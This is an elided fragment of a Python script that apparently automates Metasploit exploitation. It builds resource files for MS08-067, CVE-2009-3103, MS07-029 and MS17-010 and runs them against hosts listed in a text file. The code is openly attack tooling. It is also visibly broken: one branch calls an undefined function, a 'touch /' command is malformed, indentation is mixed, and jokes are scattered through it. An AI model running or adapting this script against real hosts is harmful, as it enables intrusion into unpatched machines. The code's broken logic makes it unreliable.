...
def MS08_067(hosts):
  with open('ip.txt', 'rb') as fp:
    ...
    os.system('echo show options >> MS08_067.rc')
...
def CVE_2009_3103(hosts): #name of function and host defined
 with open('ip.txt', 'rb') as fp:
  ...
  os.system('touch / CVE3103.rc') # makes file with bash command
  ...
  #os.system('echo set TARGETURI cgi/bin >> custom_shock.rc') #no cgi/bin/bash for this Not needed uwu
...
def MS07_029(hosts): #name of function and host defined
 with open('ip.txt', 'rb') as fp:
  hosts = fp.read()[:+12]
  ...
  #os.system('echo set TARGETURI cgi/bin >> MS029.rc')
...
if __name__ == "__main__":
    with open('exploits.txt', 'r') as searchfile:
		 ...
		 if 'MS08-067' in line:
               		 print('I hate Hacking')
               		 ms09(hosts)	
		
				
		 if 'MS17-010' in line:
               		 print('its over 900000')
               		 MS17_010(hosts)
